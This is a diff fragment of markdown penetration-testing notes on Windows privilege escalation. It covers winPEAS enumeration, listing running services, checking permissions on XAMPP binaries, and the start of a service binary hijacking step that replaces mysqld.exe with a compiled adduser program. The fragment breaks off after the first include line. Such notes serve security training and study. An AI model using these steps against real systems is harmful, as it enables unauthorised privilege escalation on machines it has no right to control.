@@ -1147,11 +1147,11 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   -  Run winPEAS `.\winPEAS.exe`  
   -  Review output: system info (Windows), NTLM settings, transcripts history, Users, possible password
 - Service Binary Hijacking (RDP)
-  - List of services with binary path > Apache, mysql
+  - List of services with binary path > Apache, mysql  
     `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
-  - Permissions of httpd.exe > Full, Modify, RX, R, W
-    `icacls "C:\xampp\apache\bin\httpd.exe"` //BULLTIN\Users:(RX)
-    `icacls "C:\xampp\mysql\bin\mysqld.exe"` //BULLTIN\Users:(F)
+  - Permissions of httpd.exe > Full, Modify, RX, R, W  
+    `icacls "C:\xampp\apache\bin\httpd.exe"` //BULLTIN\Users:(RX)  
+    `icacls "C:\xampp\mysql\bin\mysqld.exe"` //BULLTIN\Users:(F)  
   - create a binary file adduser.c to replace the original mysqld.exe
     ```
     #include <stdlib.h>
